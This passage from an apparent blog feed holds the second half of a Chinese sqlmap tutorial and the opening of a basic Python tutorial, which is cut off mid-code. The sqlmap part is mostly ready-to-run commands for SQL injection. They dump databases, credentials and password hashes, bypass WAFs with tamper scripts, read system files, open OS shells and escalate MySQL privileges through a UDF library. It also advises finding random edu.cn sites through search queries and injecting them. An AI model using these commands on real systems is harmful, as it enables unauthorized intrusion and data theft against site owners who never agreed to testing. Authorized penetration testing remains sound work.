<li>–priv-esc          数据库进程用户权限提升</li>
<li>–msf-path=MSFPATH  MetasploitFramework本地的安装路径</li>
<li>–tmp-path=TMPPATH  远程临时文件目录的绝对路径</li>
</ul>
<p>linux查看当前用户命令：</p>
<blockquote>
<p>sqlmap.py -u”<a href="http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot;">http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot;</a> –os-cmd id -v1</p>
</blockquote>
<h3 id="1-3-14-Windows注册表访问"><a href="#1-3-14-Windows注册表访问" class="headerlink" title="1.3.14 Windows注册表访问"></a>1.3.14 Windows注册表访问</h3><p>这些选项可以被用来访问后端数据库管理系统Windows注册表</p>
<ul>
<li>–reg-read          读一个Windows注册表项值</li>
<li>–reg-add           写一个Windows注册表项值数据</li>
<li>–reg-del           删除Windows注册表键值</li>
<li>–reg-key=REGKEY    Windows注册表键</li>
<li>–reg-value=REGVAL  Windows注册表项值</li>
<li>–reg-data=REGDATA  Windows注册表键值数据</li>
<li>–reg-type=REGTYPE  Windows注册表项值类型</li>
</ul>
<h3 id="1-3-15-一般选项"><a href="#1-3-15-一般选项" class="headerlink" title="1.3.15 一般选项"></a>1.3.15 一般选项</h3><p>这些选项可以用来设置一些一般的工作参数</p>
<ul>
<li>-s SESSIONFILE     保存和恢复检索会话文件的所有数据</li>
<li>-t TRAFFICFILE      记录所有HTTP流量到一个文本文件中</li>
<li>–batch            从不询问用户输入，使用所有默认配置。</li>
<li>–binary-fields=..  结果字段具有二进制值(e.g.”digest”)</li>
<li>–charset=CHARSET   强制字符编码</li>
<li>–crawl=CRAWLDEPTH  从目标URL爬行网站</li>
<li>–crawl-exclude=..  正则表达式从爬行页中排除</li>
<li>–csv-del=CSVDEL    限定使用CSV输出 (default”,”)</li>
<li>–dump-format=DU..  转储数据格式(CSV(default), HTML or SQLITE)</li>
<li>–eta              显示每个输出的预计到达时间</li>
<li>–flush-session     刷新当前目标的会话文件</li>
<li>–forms           解析和测试目标URL表单</li>
<li>–fresh-queries     忽略在会话文件中存储的查询结果</li>
<li>–hex             使用DBMS Hex函数数据检索</li>
<li>–output-dir=OUT..  自定义输出目录路径</li>
<li>–parse-errors      解析和显示响应数据库错误信息</li>
<li>–save=SAVECONFIG   保存选项到INI配置文件</li>
<li>–scope=SCOPE    从提供的代理日志中使用正则表达式过滤目标</li>
<li>–test-filter=TE..  选择测试的有效载荷和/或标题(e.g. ROW)</li>
<li>–test-skip=TEST..  跳过试验载荷和/或标题(e.g.BENCHMARK)</li>
<li>–update            更新sqlmap</li>
</ul>
<h3 id="1-3-16-其他"><a href="#1-3-16-其他" class="headerlink" title="1.3.16 其他"></a>1.3.16 其他</h3><ul>
<li>-z MNEMONICS        使用短记忆法 (e.g.”flu,bat,ban,tec=EU”)</li>
<li>–alert=ALERT       发现SQL注入时，运行主机操作系统命令</li>
<li>–answers=ANSWERS   当希望sqlmap提出输入时，自动输入自己想要的答案(e.g. “quit=N,follow=N”)，例如：sqlmap.py -u”<a href="http://192.168.22.128/get_int.php?id=1&quot;--technique=E--answers=&quot;extending=N&quot;">http://192.168.22.128/get_int.php?id=1&quot;--technique=E--answers=&quot;extending=N&quot;</a>    –batch</li>
<li>–beep    发现sql注入时，发出蜂鸣声。</li>
<li>–cleanup     清除sqlmap注入时在DBMS中产生的udf与表。</li>
<li>–dependencies      Check formissing (non-core) sqlmap dependencies</li>
<li>–disable-coloring  默认彩色输出，禁掉彩色输出。</li>
<li>–gpage=GOOGLEPAGE 使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试</li>
<li>–identify-waf      进行WAF/IPS/IDS保护测试，目前大约支持30种产品的识别</li>
<li>–mobile     有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。</li>
<li>–offline           Work inoffline mode (only use session data)</li>
<li>–purge-output     从输出目录安全删除所有内容，有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。</li>
<li>–skip-waf           跳过WAF／IPS / IDS启发式检测保护</li>
<li>–smart            进行积极的启发式测试，快速判断为注入的报错点进行注入</li>
<li>–sqlmap-shell      互动提示一个sqlmapshell</li>
<li>–tmp-dir=TMPDIR    用于存储临时文件的本地目录</li>
<li>–web-root=WEBROOT  Web服务器的文档根目录(e.g.”/var/www”)</li>
<li>–wizard   新手用户简单的向导使用，可以一步一步教你如何输入针对目标注入</li>
</ul>
<h2 id="1-4-实际利用"><a href="#1-4-实际利用" class="headerlink" title="1.4 实际利用"></a>1.4 实际利用</h2><h3 id="1-4-1-检测和利用SQL注入"><a href="#1-4-1-检测和利用SQL注入" class="headerlink" title="1.4.1 检测和利用SQL注入"></a>1.4.1 检测和利用SQL注入</h3><p><strong>1. 手工判断是否存在漏洞</strong></p>
<p>对动态网页进行安全审计，通过接受动态用户提供的GET、POST、Cookie参数值、User-Agent请求头。</p>
<p>原始网页：<a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1</a></p>
<p>构造url1：<a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=1">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=1</a></p>
<p>构造url2：<a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=2">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=2</a></p>
<p>如果url1访问结果跟原始网页一致，而url2跟原始网页不一致，有出错信息或者显示内容不一致，则证明存在SQL注入。</p>
<p><strong>2. sqlmap自动检测</strong></p>
<p>检测语法：sqlmap.py -u <a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1</a></p>
<p>技巧：在实际检测过程中，sqlmap会不停的询问，需要手工输入Y/N来进行下一步操作，可以使用参数“–batch”命令来自动答复和判断。</p>
<p><strong>3. 寻找和判断实例</strong></p>
<p>通过百度对“inurl:news.asp?id=site:edu.cn”、“inurl:news.php?id= site:edu.cn”、“inurl:news.aspx?id=site:edu.cn”进行搜索，搜索news.php/asp/aspx，站点为edu.cn。随机打开一个网页搜索结果，如果能够正常访问，则复制该URL地址。</p>
<p>将该url使用sqlmap进行注入测试，，测试结果可能存在SQL注入，也可能不存在SQL注入，存在则可以进行数据库名称，数据库表以及数据的操作。</p>
<p><strong>4. 批量检测</strong><br>将目标url搜集并整理为txt文件，如图4所示，所有文件都保存为tg.txt，然后使用“sqlmap.py-m tg.txt”，注意tg.txt跟sqlmap在同一个目录下。<br><img src="%E6%89%B9%E9%87%8F%E6%95%B4%E7%90%86%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80.jpg" alt="批量整理目标地址"></p>
<h3 id="1-4-2-直接连接数据库"><a href="#1-4-2-直接连接数据库" class="headerlink" title="1.4.2 直接连接数据库"></a>1.4.2 直接连接数据库</h3><blockquote>
<p>sqlmap.py -d”mysql://admin:<a href="mailto:&#x61;&#x64;&#109;&#105;&#x6e;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#50;&#49;&#46;&#x31;&#55;">&#x61;&#x64;&#109;&#105;&#x6e;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#50;&#49;&#46;&#x31;&#55;</a>:3306/testdb” -f –banner –dbs–users</p>
</blockquote>
<h3 id="1-4-3数据库相关操作"><a href="#1-4-3数据库相关操作" class="headerlink" title="1.4.3数据库相关操作"></a>1.4.3数据库相关操作</h3><ul>
<li>列数据库信息：–dbs</li>
<li>web当前使用的数据库–current-db</li>
<li>web数据库使用账户–current-user</li>
<li>列出sqlserver所有用户 –users</li>
<li>数据库账户与密码 –passwords</li>
<li>指定库名列出所有表  -D database –tables<ul>
<li>-D：指定数据库名称</li>
</ul>
</li>
<li>指定库名表名列出所有字段 -D antian365-T admin –columns<ul>
<li>-T：指定要列出字段的表</li>
</ul>
</li>
<li>指定库名表名字段dump出指定字段<ul>
<li>-D secbang_com -T admin -C  id,password ,username –dump</li>
<li>-D antian365 -T userb -C”email,Username,userpassword” –dump</li>
<li>可加双引号，也可不加双引号。</li>
</ul>
</li>
<li>导出多少条数据<ul>
<li>-D tourdata -T userb -C”email,Username,userpassword” –start 1 –stop 10 –dump （）</li>
<li>参数：<ul>
<li>–start：指定开始的行</li>
<li>–stop：指定结束的行</li>
</ul>
</li>
<li>此条命令的含义为：导出数据库tourdata中的表userb中的字段(email,Username,userpassword)中的第1到第10行的数据内容。</li>
</ul>
</li>
</ul>
<h2 id="1-5-SQLMAP实用技巧"><a href="#1-5-SQLMAP实用技巧" class="headerlink" title="1.5 SQLMAP实用技巧"></a>1.5 SQLMAP实用技巧</h2><h3 id="15-1-mysql的注释方法进行绕过WAF进行SQL注入"><a href="#15-1-mysql的注释方法进行绕过WAF进行SQL注入" class="headerlink" title="15.1 mysql的注释方法进行绕过WAF进行SQL注入"></a>15.1 mysql的注释方法进行绕过WAF进行SQL注入</h3><ol>
<li>修改 C:\Python27\sqlmap\tamper\halfversionedmorekeywords.py<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> match.group().replace(word,<span class="string">&quot;/*!0%s&quot;</span> % word) 为：</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> match.group().replace(word,<span class="string">&quot;/*!50000%s*/&quot;</span> % word)</span><br></pre></td></tr></table></figure></li>
<li>修改C:\Python27\sqlmap\xml\queries.xml<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">cast</span> <span class="attr">query</span>=<span class="string">&quot;CAST(%s ASCHAR)&quot;</span>/&gt;</span>为：</span><br><span class="line"></span><br><span class="line">&lt;castquery=&quot;convert(%s,CHAR)&quot;/&gt;</span><br></pre></td></tr></table></figure></li>
<li>使用sqlmap进行注入测试<blockquote>
<p>sqlmap.py -u”http://**.com/detail.php? id=16” –tamper “halfversionedmorekeywords.py”</p>
</blockquote>
</li>
</ol>
<p>其它绕过waf脚本方法：</p>
<blockquote>
<p>sqlmap.py-u “<a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot;">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot;</a> –tampertamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3</p>
</blockquote>
<ol start="4">
<li>tamper目录下文件具体含义：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">space2comment.py用&#x2F;**&#x2F;代替空格</span><br><span class="line"></span><br><span class="line">apostrophemask.py用utf8代替引号</span><br><span class="line"></span><br><span class="line">equaltolike.pylike代替等号</span><br><span class="line"></span><br><span class="line">space2dash.py　绕过过滤‘&#x3D;’ 替换空格字符（”），（’–‘）后跟一个破折号注释，一个随机字符串和一个新行（’n’）</span><br><span class="line"></span><br><span class="line">greatest.py　绕过过滤’&gt;’ ,用GREATEST替换大于号。</span><br><span class="line"></span><br><span class="line">space2hash.py空格替换为#号,随机字符串以及换行符</span><br><span class="line"></span><br><span class="line">apostrophenullencode.py绕过过滤双引号，替换字符和双引号。</span><br><span class="line"></span><br><span class="line">halfversionedmorekeywords.py当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</span><br><span class="line"></span><br><span class="line">space2morehash.py空格替换为 #号 以及更多随机字符串 换行符</span><br><span class="line"></span><br><span class="line">appendnullbyte.py在有效负荷结束位置加载零字节字符编码</span><br><span class="line"></span><br><span class="line">ifnull2ifisnull.py　绕过对IFNULL过滤,替换类似’IFNULL(A,B)’为’IF(ISNULL(A), B, A)’</span><br><span class="line"></span><br><span class="line">space2mssqlblank.py(mssql)空格替换为其它空符号</span><br><span class="line"></span><br><span class="line">base64encode.py　用base64编码替换</span><br><span class="line"></span><br><span class="line">space2mssqlhash.py　替换空格</span><br><span class="line"></span><br><span class="line">modsecurityversioned.py过滤空格，包含完整的查询版本注释</span><br><span class="line"></span><br><span class="line">space2mysqlblank.py　空格替换其它空白符号(mysql)</span><br><span class="line"></span><br><span class="line">between.py用between替换大于号（&gt;）</span><br><span class="line"></span><br><span class="line">space2mysqldash.py替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</span><br><span class="line"></span><br><span class="line">multiplespaces.py围绕SQL关键字添加多个空格</span><br><span class="line"></span><br><span class="line">space2plus.py用+替换空格</span><br><span class="line"></span><br><span class="line">bluecoat.py代替空格字符后与一个有效的随机空白字符的SQL语句,然后替换&#x3D;为like</span><br><span class="line"></span><br><span class="line">nonrecursivereplacement.py双重查询语句,取代SQL关键字</span><br><span class="line"></span><br><span class="line">space2randomblank.py代替空格字符（“”）从一个随机的空白字符可选字符的有效集</span><br><span class="line"></span><br><span class="line">sp_password.py追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</span><br><span class="line"></span><br><span class="line">chardoubleencode.py双url编码(不处理以编码的)</span><br><span class="line"></span><br><span class="line">unionalltounion.py替换UNION ALLSELECT UNION SELECT</span><br><span class="line"></span><br><span class="line">charencode.py　url编码</span><br><span class="line"></span><br><span class="line">randomcase.py随机大小写</span><br><span class="line"></span><br><span class="line">unmagicquotes.py宽字符绕过 GPCaddslashes</span><br><span class="line"></span><br><span class="line">randomcomments.py用&#x2F;**&#x2F;分割sql关键字</span><br><span class="line"></span><br><span class="line">charunicodeencode.py字符串 unicode 编码</span><br><span class="line"></span><br><span class="line">securesphere.py追加特制的字符串</span><br><span class="line"></span><br><span class="line">versionedmorekeywords.py注释绕过</span><br><span class="line"></span><br><span class="line">space2comment.py替换空格字符串(‘‘) 使用注释‘&#x2F;**&#x2F;’</span><br><span class="line"></span><br><span class="line">halfversionedmorekeywords.py关键字前加注释</span><br></pre></td></tr></table></figure>
<h3 id="15-2-URL重写SQL注入测试"><a href="#15-2-URL重写SQL注入测试" class="headerlink" title="15.2 URL重写SQL注入测试"></a>15.2 URL重写SQL注入测试</h3>value1为测试参数，加“*”即可，sqlmap将会测试value1的位置是否可注入。</li>
</ol>
<blockquote>
<p>sqlmap.py -u”<a href="http://targeturl/param1/value1*/param2/value2/&quot;">http://targeturl/param1/value1*/param2/value2/&quot;</a></p>
</blockquote>
<h3 id="15-3-列举并破解密码哈希值"><a href="#15-3-列举并破解密码哈希值" class="headerlink" title="15.3 列举并破解密码哈希值"></a>15.3 列举并破解密码哈希值</h3><p>当前用户有权限读取包含用户密码的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。</p>
<blockquote>
<p>sqlmap.py -u”<a href="http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot;">http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot;</a> –passwords -v1</p>
</blockquote>
<h3 id="15-4-获取表中的数据个数"><a href="#15-4-获取表中的数据个数" class="headerlink" title="15.4 获取表中的数据个数"></a>15.4 获取表中的数据个数</h3><blockquote>
<p>sqlmap.py -u”<a href="http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1&quot;">http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1&quot;</a> –count -Dtestdb</p>
</blockquote>
<h3 id="15-5-对网站secbang-com进行漏洞爬去"><a href="#15-5-对网站secbang-com进行漏洞爬去" class="headerlink" title="15.5 对网站secbang.com进行漏洞爬去"></a>15.5 对网站secbang.com进行漏洞爬去</h3><blockquote>
<p>sqlmap.py -u “<a href="http://www.secbang.com&quot;--batch/">http://www.secbang.com&quot;--batch</a> –crawl=3</p>
</blockquote>
<h3 id="15-6-基于布尔SQL注入预估时间"><a href="#15-6-基于布尔SQL注入预估时间" class="headerlink" title="15.6 基于布尔SQL注入预估时间"></a>15.6 基于布尔SQL注入预估时间</h3><blockquote>
<p>sqlmap.py -u “<a href="http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1&quot;-b">http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1&quot;-b</a> –eta</p>
</blockquote>
<h3 id="15-7-使用hex避免字符编码导致数据丢失"><a href="#15-7-使用hex避免字符编码导致数据丢失" class="headerlink" title="15.7 使用hex避免字符编码导致数据丢失"></a>15.7 使用hex避免字符编码导致数据丢失</h3><blockquote>
<p>sqlmap.py -u “<a href="http://192.168.48.130/pgsql/get_int.php?id=1&quot;">http://192.168.48.130/pgsql/get_int.php?id=1&quot;</a> –banner –hex -v 3 –parse-errors</p>
</blockquote>
<h3 id="15-8-模拟测试手机环境站点"><a href="#15-8-模拟测试手机环境站点" class="headerlink" title="15.8.模拟测试手机环境站点"></a>15.8.模拟测试手机环境站点</h3><blockquote>
<p>python sqlmap.py -u”<a href="http://www.target.com/vuln.php?id=1&quot;">http://www.target.com/vuln.php?id=1&quot;</a> –mobile</p>
</blockquote>
<h3 id="15-9-智能判断测试"><a href="#15-9-智能判断测试" class="headerlink" title="15.9 智能判断测试"></a>15.9 智能判断测试</h3><blockquote>
<p>sqlmap.py -u “<a href="http://www.antian365.com/info.php?id=1&quot;--batch">http://www.antian365.com/info.php?id=1&quot;--batch</a> –smart</p>
</blockquote>
<h3 id="15-10-结合burpsuite进行注入"><a href="#15-10-结合burpsuite进行注入" class="headerlink" title="15.10 结合burpsuite进行注入"></a>15.10 结合burpsuite进行注入</h3><ol>
<li><p>burpsuite抓包，需要设置burpsuite记录请求日志</p>
<blockquote>
<p>sqlmap.py -r burpsuite抓包.txt</p>
</blockquote>
</li>
<li><p>指定表单注入</p>
<blockquote>
<p>sqlmap.py -u URL –data“username=a&amp;password=a”</p>
</blockquote>
</li>
</ol>
<h3 id="15-11-sqlmap自动填写表单注入"><a href="#15-11-sqlmap自动填写表单注入" class="headerlink" title="15.11 sqlmap自动填写表单注入"></a>15.11 sqlmap自动填写表单注入</h3><p>自动填写表单：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u URL --forms </span><br><span class="line"></span><br><span class="line">sqlmap.py -u URL --forms --dbs</span><br><span class="line"></span><br><span class="line">sqlmap.py -u URL --forms --current-db</span><br><span class="line"></span><br><span class="line">sqlmap.py -u URL --forms -D 数据库名称--tables</span><br><span class="line"></span><br><span class="line">sqlmap.py -u URL --forms -D 数据库名称 -T 表名 --columns</span><br><span class="line"></span><br><span class="line">sqlmap.py -u URL --forms -D 数据库名称 -T 表名 -Cusername，password --dump</span><br></pre></td></tr></table></figure>

<h3 id="15-12读取linux下文件"><a href="#15-12读取linux下文件" class="headerlink" title="15.12读取linux下文件"></a>15.12读取linux下文件</h3><blockquote>
<p>sqlmap.py-u “url” –file /etc/password</p>
</blockquote>
<h3 id="15-13-延时注入"><a href="#15-13-延时注入" class="headerlink" title="15.13 延时注入"></a>15.13 延时注入</h3><blockquote>
<p>sqlmap.py -u URL –technique -T–current-user</p>
</blockquote>
<h3 id="15-14-sqlmap-结合burpsuite进行post注入"><a href="#15-14-sqlmap-结合burpsuite进行post注入" class="headerlink" title="15.14 sqlmap 结合burpsuite进行post注入"></a>15.14 sqlmap 结合burpsuite进行post注入</h3><p>结合burpsuite来使用sqlmap：</p>
<ol>
<li>浏览器打开目标地址<a href="http://www.antian365.com/">http://www.antian365.com</a></li>
<li>配置burp代理(127.0.0.1:8080)以拦截请求</li>
<li>点击登录表单的submit按钮</li>
<li>Burp会拦截到了我们的登录POST请求</li>
<li>把这个post请求复制为txt, 我这命名为post.txt 然后把它放至sqlmap目录下</li>
<li>运行sqlmap并使用如下命令：<br> <code>./sqlmap.py -r post.txt -p tfUPass</code></li>
</ol>
<h3 id="15-15-sqlmap-cookies注入"><a href="#15-15-sqlmap-cookies注入" class="headerlink" title="15.15 sqlmap cookies注入"></a>15.15 sqlmap cookies注入</h3><blockquote>
<p>sqlmap.py -u “<a href="http://127.0.0.1/base.PHP&quot;%E2%80%93cookies">http://127.0.0.1/base.PHP&quot;–cookies</a> “id=1”  –dbs –level 2</p>
</blockquote>
<p>默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值&gt;=2的时候也会检查cookie里面的参数，当&gt;=3的时候将检查User-agent和Referer。可以通过burpsuite等工具获取当前的cookie值，然后进行注入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u 注入点URL --cookie&quot;id&#x3D;xx&quot; --level 3</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url --cookie &quot;id&#x3D;xx&quot;--level 3 --tables(猜表名)</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url --cookie &quot;id&#x3D;xx&quot;--level 3 -T 表名 --coiumns</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url --cookie &quot;id&#x3D;xx&quot;--level 3 -T 表名 -C username，password --dump</span><br></pre></td></tr></table></figure>

<h3 id="15-16-mysql提权"><a href="#15-16-mysql提权" class="headerlink" title="15.16 mysql提权"></a>15.16 mysql提权</h3><ol>
<li><p>连接mysql数据打开一个交互shell:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -dmysql:&#x2F;&#x2F;root:root@127.0.0.1:3306&#x2F;test --sql-shell</span><br><span class="line"></span><br><span class="line">select @@version;</span><br><span class="line"></span><br><span class="line">select @@plugin_dir;</span><br><span class="line"></span><br><span class="line">d:\\wamp2.5\\bin\\mysql\\mysql5.6.17\\lib\\plugin\\</span><br></pre></td></tr></table></figure></li>
<li><p>利用sqlmap上传lib_mysqludf_sys到MySQL插件目录:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -dmysql:&#x2F;&#x2F;root:root@127.0.0.1:3306&#x2F;test --file-write&#x3D;d:&#x2F;tmp&#x2F;lib_mysqludf_sys.dll--file-dest&#x3D;d:\\wamp2.5\\bin\\mysql\\mysql5.6.17\\lib\\plugin\\lib_mysqludf_sys.dll</span><br><span class="line"></span><br><span class="line">CREATE FUNCTION sys_exec RETURNS STRINGSONAME &#39;lib_mysqludf_sys.dll&#39;</span><br><span class="line"></span><br><span class="line">CREATE FUNCTION sys_eval RETURNS STRINGSONAME &#39;lib_mysqludf_sys.dll&#39;</span><br><span class="line"></span><br><span class="line">select sys_eval(&#39;ver&#39;); </span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="15-17-执行shell命令"><a href="#15-17-执行shell命令" class="headerlink" title="15.17 执行shell命令"></a>15.17 执行shell命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;url&quot; –os-cmd&#x3D;&quot;netuser&quot; &#x2F;*执行net user命令*&#x2F;</span><br><span class="line"></span><br><span class="line">sqlmap.py -u &quot;url&quot; –os-shell &#x2F;*系统交互的shell*&#x2F;</span><br></pre></td></tr></table></figure>

<h3 id="15-18-延时注入"><a href="#15-18-延时注入" class="headerlink" title="15.18 延时注入"></a>15.18 延时注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap –dbs -u&quot;url&quot; –delay 0.5 &#x2F;*延时0.5秒*&#x2F;</span><br><span class="line"></span><br><span class="line">sqlmap –dbs -u&quot;url&quot; –safe-freq &#x2F;*请求2次*&#x2F;</span><br></pre></td></tr></table></figure>



<p>参考文章：</p>
<ul>
<li><a href="http://sqlmap.org/">http://sqlmap.org/</a></li>
<li><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></li>
<li><a href="https://github.com/sqlmapproject/sqlmap/wiki">https://github.com/sqlmapproject/sqlmap/wiki</a></li>
<li><a href="https://sobug.com/article/detail/2">https://sobug.com/article/detail/2</a></li>
<li><a href="https://blog.xiaohack.org/1378.html">https://blog.xiaohack.org/1378.html</a></li>
</ul>
<p>————————<br>本文作者：simeon， 转载请注明来自<a href="https://www.freebuf.com/">FreeBuf.COM</a><br>原文：<a href="https://www.freebuf.com/sectool/164608.html">超详细SQLMap使用攻略及技巧分享</a></p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>【python】python基础</title>
    <url>/python%E5%9F%BA%E7%A1%80/python%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>python 基础语法</p>
<span id="more"></span>

<h1 id="1-python-解释器"><a href="#1-python-解释器" class="headerlink" title="1. python 解释器"></a>1. python 解释器</h1><p>我们编写的Python代码都要放在Python解释器上运行，解释器是代码与计算机硬件之间的软件逻辑层。根据选用的Python版本的不同，解释器本身可以用C语言实现（Python的官方实现版本）、Java语言实现或者其他的形式。无论使用采用什么版本，编写好的Python程序代码必须放在解释器中运行。</p>
<p>将我们编写好的Python代码放到解释器中运行，此过程主要分为两步，第一步是将源码编译成“字节码”，第二步是将编译好的字节码转发到Python“虚拟机”中运行。当然对于程序员来说，这两步都是隐藏的。</p>
<h2 id="1-1-字节码编译"><a href="#1-1-字节码编译" class="headerlink" title="1.1 字节码编译"></a>1.1 字节码编译</h2><p>当我们运行Python代码时，Python解释器内部会先通过词法分析器将文件中的每一条代码语句分解为单一步骤，然后编译成字节码的形式。编译只是一个简单的翻译步骤，而且字节码是属于源代码层次范围内的底层代码，是与平台无关的，所以编译好的字节码是可以跨平台运行的。这些字节码可以提高执行速度，比起原始的源代码语句，字节码的运行速度要快很多。</p>
<p>如果Python进程在机器上拥有写入权限，那么它将把编译好的字节码保存为一个以 .pyc 为扩展名的文件。Python这样做是作为一种启动速度的优化，下一次运行程序的时候，如果你在上次保存字节码之后没有修改过源代码，Python将会直接加载 .pyc文件，并跳过编译这个步骤。如果你修改了源代码，下次运行程序时，字节码文件将自动重新创建。</p>
<h2 id="1-2-Python虚拟机（PVM）"><a href="#1-2-Python虚拟机（PVM）" class="headerlink" title="1.2 Python虚拟机（PVM）"></a>1.2 Python虚拟机（PVM）</h2><p>当源文件编译成字节码，字节码就会发送到Python虚拟机（PVM）上来执行。事实上，PVM就是迭代运行字节码指令的一个大循环，一个接一个的完成操作。从技术上讲，这是Python解释器的最后一步。</p>
<p>和C/C++这类完全编译语言相比，Python的工作中没有 “build” 和 “make” 操作，也就是没有将源码编译成可以直接在机器上运行的二进制代码的过程。而且Python解释器中间形成的<strong>字节码并不是CPU可以直接运行的二进制代码，PVM仍然需要解释字节码成为二进制码，再交由CPU运行</strong>。所以Python代码无法运行的像C/C++一样快。</p>
<p>在程序开始执行之前不需要预编译和连接，只需要简单的输入并运行代码即可，这使得开发周期大大缩短。这同样使得Python具有更多的动态语言特性：在运行时，Python程序可以去构建并执行另一个Python程序，而且往往非常的方便。</p>
<h2 id="1-3-python-解释器分类"><a href="#1-3-python-解释器分类" class="headerlink" title="1.3 python 解释器分类"></a>1.3 python 解释器分类</h2><ul>
<li>CPython：C语言开发，使用最广，默认的解释器</li>
<li>IPython：基于CPython之上的交互式解释器</li>
<li>PyPy：采用JIT(Just In Time, 即时编译)技术，对python代码进行动态编译，追求执行速度</li>
<li>Jython：运行在Java平台上的解释器，可以直接编译成Java字节码执行</li>
<li>IronPython：同理Jython，运行在 .Net 平台上</li>
</ul>
<h1 id="2-变量和数据类型"><a href="#2-变量和数据类型" class="headerlink" title="2. 变量和数据类型"></a>2. 变量和数据类型</h1><h2 id="2-1-注释"><a href="#2-1-注释" class="headerlink" title="2.1 注释"></a>2.1 注释</h2><p>解释器不执行注释内容</p>
<ol>
<li><p>单行注释</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 注释内容</span></span><br></pre></td></tr></table></figure></li>
<li><p>多行注释</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  注释</span></span><br><span class="line"><span class="string">  注释</span></span><br><span class="line"><span class="string">  注释</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  注释</span></span><br><span class="line"><span class="string">  注释</span></span><br><span class="line"><span class="string">  注释</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="2-2-变量"><a href="#2-2-变量" class="headerlink" title="2.2 变量"></a>2.2 变量</h2><blockquote>
<p>变量名 = 值</p>
</blockquote>
<h3 id="2-2-1-标识符"><a href="#2-2-1-标识符" class="headerlink" title="2.2.1 标识符"></a>2.2.1 标识符</h3><p>变量名要满足标识符的规则</p>
<ul>
<li>由数字、字⺟、下划线组成</li>
<li>不能数字开头</li>
<li>不能使⽤内置关键字</li>
<li>严格区分⼤⼩写</li>
</ul>
<h3 id="2-2-2-命名习惯"><a href="#2-2-2-命名习惯" class="headerlink" title="2.2.2 命名习惯"></a>2.2.2 命名习惯</h3><ul>
<li>⻅名知义。</li>
<li>⼤驼峰：即每个单词⾸字⺟都⼤写，例如： MyName 。</li>
<li>⼩驼峰：第⼆个（含）以后的单词⾸字⺟⼤写，例如： myName 。</li>
<li>下划线：例如： my_name 。</li>
</ul>
<h2 id="2-2-3-数据类型"><a href="#2-2-3-数据类型" class="headerlink" title="2.2.3 数据类型"></a>2.2.3 数据类型</h2><ul>
<li>数值</li>
<li>布尔型</li>
<li>str（字符串）</li>
<li>list（列表）</li>
<li>tuple（元组）</li>
<li>set（集合）</li>
<li>dict（字典）<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a)) <span class="comment"># &lt;class &#x27;int&#x27;&gt; -- 整型</span></span><br><span class="line"></span><br><span class="line">b = <span class="number">1.1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(b)) <span class="comment"># &lt;class &#x27;float&#x27;&gt; -- 浮点型</span></span><br><span class="line"></span><br><span class="line">c = <span class="literal">True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(c)) <span 